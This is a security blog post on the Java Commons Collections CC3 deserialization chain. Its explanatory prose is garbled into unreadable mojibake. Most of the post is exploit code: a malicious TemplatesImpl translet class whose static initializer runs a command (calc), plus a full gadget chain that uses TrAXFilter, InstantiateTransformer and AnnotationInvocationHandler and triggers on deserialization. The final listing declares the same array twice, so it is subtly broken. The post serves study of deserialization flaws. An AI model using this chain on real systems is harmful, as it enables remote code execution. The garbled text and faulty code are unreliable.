<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">    _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if this is the main class</span></span><br><span class="line">    <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†æ¶æ„æ„é€ çš„ç±»ç»§æ‰¿AbstractTransletç±»ï¼Œä½†AbstractTransletç±»æ˜¯æŠ½è±¡ç±»ï¼Œå¹¶ä¸”ä¹Ÿç»§æ‰¿äº†Transletç±»ï¼Œä¸”AbstractTransletç±»é‡å†™äº†Transletç±»çš„å¾ˆå¤šæ–¹æ³•ï¼Œä½†æœ‰ä¸¤ä¸ªæ–¹æ³•æœªé‡å†™</p>
<p>æ‰€ä»¥æˆ‘ä»¬åœ¨æ¶æ„æ„é€ ç±»ä¸­ä¹Ÿè¦é‡å†™Transletç±»ä¸­çš„æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler handler)</span></span><br><span class="line">    <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        transform(document, document.getIterator(), handler);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        _keyIndexes = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é‡å†™æ„é€ æ¶æ„åŠ è½½ç±»</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pay</span>  <span class="keyword">extends</span>  <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Test.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\java-test\\TemplatesImpl\\TemplatesImpl\\target\\classes\\com\\javatest\\Pay.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        setValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,codes);</span><br><span class="line">        setValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æˆåŠŸç›´æ¥æ¶æ„ä»£ç </p>
<h1 id="CC1ä¸TemplatesImplçš„ç»“åˆ"><a href="#CC1ä¸TemplatesImplçš„ç»“åˆ" class="headerlink" title="CC1ä¸TemplatesImplçš„ç»“åˆ"></a>CC1ä¸TemplatesImplçš„ç»“åˆ</h1><p>ç”±äºæ˜¯åœ¨è°ƒç”¨Runtime.exec()çš„å¦ä¸€ç§æ–¹å¼ï¼Œé€šè¿‡ç±»åŠ è½½çš„å½¢å¼åŠ¨æ€åŠ è½½æ¶æ„ç±»æ¥å®ç°è‡ªåŠ¨æ‰§è¡Œæ¶æ„ç±»ä»£ç çš„</p>
<p>InvokerTransformerä¾æ—§å¯ä»¥ä½¿ç”¨</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformerArray=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformerArray);</span><br></pre></td></tr></table></figure>
<p>åªéœ€è¦æ”¹å˜è¿™é‡Œï¼Œå…¶ä»–çš„å…¨éƒ¨ä¸å˜å°±è¡Œï¼Œå› ä¸ºæˆ‘ä»¬åªæ˜¯æ”¹å˜äº†è°ƒç”¨Runtime.exec()çš„æ–¹æ³•</p>
<p>CC6ä¸åŒç†</p>
<h1 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h1><p>é€šè¿‡å¯¹TemplatesImplä¸­çš„newTransformer()æŸ¥æ‰¾ç”¨æ³•<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-08%20134009.png"><br>é€šè¿‡åˆ†ææ‰¾åˆ°äº†æœ€æœ‰å¯èƒ½çš„åœ°æ–¹<strong>TrAXFilter</strong></p>
<h1 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h1><p>CC3çš„ä½œè€…å¹¶æœªä½¿ç”¨InvokerTransformerï¼Œè€Œæ˜¯ä½¿ç”¨äº†æ–°çš„ç±»InstantiateTransformer<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-08%20144648.png"><br>å†transfom()ä¸­åˆ¤æ–­ä¼ å…¥æ¥çš„æ˜¯ä¸æ˜¯æ˜¯ä¸æ˜¯classç±»å‹ï¼Œç„¶åå†é€šè¿‡åå°„è·å–æŒ‡å®šå‚æ•°ç±»å‹çš„æ„é€ å™¨ï¼Œå†è°ƒå…¶æ„é€ å‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure>

<p>å°†å…¶å¥—å…¥transform[]ä¸­</p>
<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class Test &#123;
    public static void main(String[] args) throws Exception &#123;

        TemplatesImpl templates = new TemplatesImpl();
        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\java-test\\TemplatesImpl\\TemplatesImpl\\target\\classes\\com\\javatest\\Pay.class&quot;));
        byte[][] codes = &#123;code&#125;;

        setValue(templates,&quot;_name&quot;,&quot;aaa&quot;);
        setValue(templates,&quot;_bytecodes&quot;,codes);
        setValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());
//        templates.newTransformer();
        Transformer[] transformerArray=new Transformer[]&#123;
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;),
        &#125;;
        Transformer[] transformerArray=new Transformer[]&#123;
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;),
        &#125;;
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformerArray);

        Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
        map.put(&quot;value&quot;, &quot;åˆæ˜¯ä¸€å¹´ç§‹é£è§ç‘Ÿ&quot;);
        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor annotationConstructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        annotationConstructor.setAccessible(true);
        Object obj = annotationConstructor.newInstance(Target.class, transformedMap);

        //serialize(obj);
        unserialize(&quot;ser1.bin&quot;);
    &#125;

    public static void setValue(Object object, String fieldName, Object value) throws Exception &#123;
        Class obj = object.getClass();
        Field field = obj.getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object,value);
    &#125;

    //åºåˆ—åŒ–æ–¹æ³•
    public static void serialize(Object object) throws Exception &#123;
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser1.bin&quot;));
        oos.writeObject(object);
    &#125;

    //ååºåˆ—åŒ–æ–¹æ³•
    public static void unserialize(String filename) throws Exception &#123;
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));
        objectInputStream.readObject();
    &#125;
&#125;

æˆåŠŸè°ƒç”¨calc
</code></pre>
</div><div class="tags"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Javaå®‰å…¨</a></li></ul></div><div class="post-nav"><a class="pre" href="/2025/09/08/CC%E9%93%BE4/">CCé“¾4</a><a class="next" href="/2025/09/04/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD/">Javaç±»åŠ è½½æœºåˆ¶</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="author-info"><a class="info-avatar" href="/about/" title="å…³äº"><img class="nofancybox" src="/img/avatar.jpg"/></a><p>æ‰€å¹¸ä»æœ‰å…‰.</p><a class="info-icon" href="https://hackerhao.top" title="Email" target="_blank" style="margin-inline:5px"> <i class="fa fa-envelope-square" style="margin-inline:5px"></i></a><a class="info-icon" href="https://github.com/isMyHao" title="Github" target="_blank" style="margin-inline:5px"> <i class="fa fa-github-square" style="margin-inline:5px"></i></a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> åˆ†ç±»</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Java-Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">Java Webå¸¸è§æ¼æ´</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">JavaåŸºç¡€çŸ¥è¯†</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Javaå®‰å…¨</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Js%E5%AE%89%E5%85%A8/">Jså®‰å…¨</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">PHPä»£ç å®¡è®¡</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PHP%E5%AE%89%E5%85%A8/">PHPå®‰å…¨</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Win%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">Winæƒé™æå‡</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E6%8F%90%E6%9D%83/">linuxææƒ</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%91%E5%AE%89%E5%85%A8/">äº‘å®‰å…¨</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">ä»£ç å®¡è®¡</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%8D%E6%9D%80/">å…æ€</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91/">å†…ç½‘</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">åŸºç¡€çŸ¥è¯†</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">æƒé™æå‡</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/">æ¼æ´å‘ç°</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">é¶åœº</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> æ ‡ç­¾</i></div><div class="tagcloud"><a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 15px;">åŸºç¡€</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 15px;">å…æ€</a> <a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 15px;">Javaå®‰å…¨</a> <a href="/tags/Js%E5%AE%89%E5%85%A8/" style="font-size: 15px;">Jså®‰å…¨</a> <a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 15px;">JavaåŸºç¡€</a> <a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 15px;">PHPä»£ç å®¡è®¡</a> <a href="/tags/PHP%E5%AE%89%E5%85%A8/" style="font-size: 15px;">PHPå®‰å…¨</a> <a href="/tags/Java-Web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">Java Webå¸¸è§æ¼æ´</a> <a href="/tags/linux%E6%8F%90%E6%9D%83/" style="font-size: 15px;">linuxææƒ</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 15px;">ä»£ç å®¡è®¡</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 15px;">é¶åœº</a> <a href="/tags/%E4%BA%91%E5%AE%89%E5%85%A8/" style="font-size: 15px;">äº‘å®‰å…¨</a> <a href="/tags/tools/" style="font-size: 15px;">tools</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 15px;">å†…ç½‘</a> <a href="/tags/Win%E6%8F%90%E5%8D%87/" style="font-size: 15px;">Winæå‡</a> <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" style="font-size: 15px;">æƒé™æå‡</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/" style="font-size: 15px;">æ¼æ´å‘ç°</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> æœ€è¿‘æ–‡ç« </i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/09/12/CC%E9%93%BE5/">CCé“¾5</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/09/08/CC%E9%93%BE4/">CCé“¾4</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/09/07/CC%E9%93%BE3/">CCé“¾3</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/09/04/Java-%E7%B1%BB%E5%8A%A0%E8%BD%BD/">Javaç±»åŠ è½½æœºåˆ¶</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/09/03/CC%E9%93%BE6/">CCé“¾6</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/09/02/CC%E9%93%BE2/">CCé“¾2</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/09/02/CC%E9%93%BE1-LazyMap/">CCé“¾1-LazyMap</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/09/01/CC%E9%93%BE1/">CCé“¾1-TransformedMap</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/08/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Java ååºåˆ—åŒ–æ¼æ´</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/08/23/java%20Xss%E6%BC%8F%E6%B4%9E/">Java Xssæ¼æ´</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> å‹æƒ…é“¾æ¥</i></div></div></div></div><div class="pure-u-1 pure-u-md-3-4"></div></div><script type="text/javascript" src="https://unpkg.com/@fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=undefined" async></script><link rel="stylesheet" type="text/css" href="https://unpkg.com/@fancyapps/fancybox/dist/jquery.fancybox.min.css"><link rel="stylesheet" type="text/css" href="/css/search.css?v=undefined"><script type="text/javascript" src="/js/search.js?v=undefined"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
  search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" color="0,0,0" opacity="0.5" zIndex="-2" count="50" src="https://unpkg.com/canvas-nest.js/dist/canvas-nest.js"></script><script type="text/javascript" src="/js/love.js?v=undefined"></script><script type="text/javascript" src="/js/copycode.js?v=undefined" successtext="å¤åˆ¶æˆåŠŸï¼"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css?v=undefined"><link rel="stylesheet" type="text/css" href="/css/external.css?v=undefined"><script type="text/javascript" src="/js/codeblock-resizer.js?v=undefined"></script><script type="text/javascript" src="/js/smartresize.js?v=undefined"></script></div></body></html>